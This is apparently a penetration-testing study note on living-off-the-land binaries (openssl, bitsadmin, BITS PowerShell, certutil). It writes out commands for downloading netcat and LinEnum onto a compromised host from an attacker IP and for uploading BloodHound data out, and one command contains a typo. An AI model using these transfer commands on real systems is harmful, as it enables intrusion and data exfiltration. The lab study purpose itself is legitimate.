---
title:  "LOLBins"
tags:
  - hacking
  - hacking/htb
programming-languagues:
created: 2022-07-11
---
Aka Living off the land binaries, which are binaries that an attacker can use to perform actions beyond their original purpose.

Two websites on this:
- LOLBAS Project for **Windows** Binaries ([here](https://lolbas-project.github.io/#))
- GTFOBins for **Linux** Binaries ([here](https://gtfobins.github.io/))

They can be used to perform actions like:
- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

## GTFOBins
We can search for the download and upload function using `+file download` and `+file upload`:

We can use **openssl**. We first need to create a certificate and start a server.

### Create Certificate in Pwnbox
```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

### Stand up the Server in our Pwnbox
```bash
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Now to download the file from the compromised machine.

### Download File from the Compromised Machine
```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Other Lol Tools
### Bitsadmin Download function
The Background Intelligent Transfer Service ([BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)) can be used to download files from HTTP sites and SMB shares.

#### File download with bitsadmin
```powershell
PS bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

#### Download
```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```

#### Upload
```powershell
Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override-ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
```

### Certutil
A defacto to `wget`. The Antimalware Scan Interface (AMSI) detects this as malicious Certutil usage:

```bash
cerutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```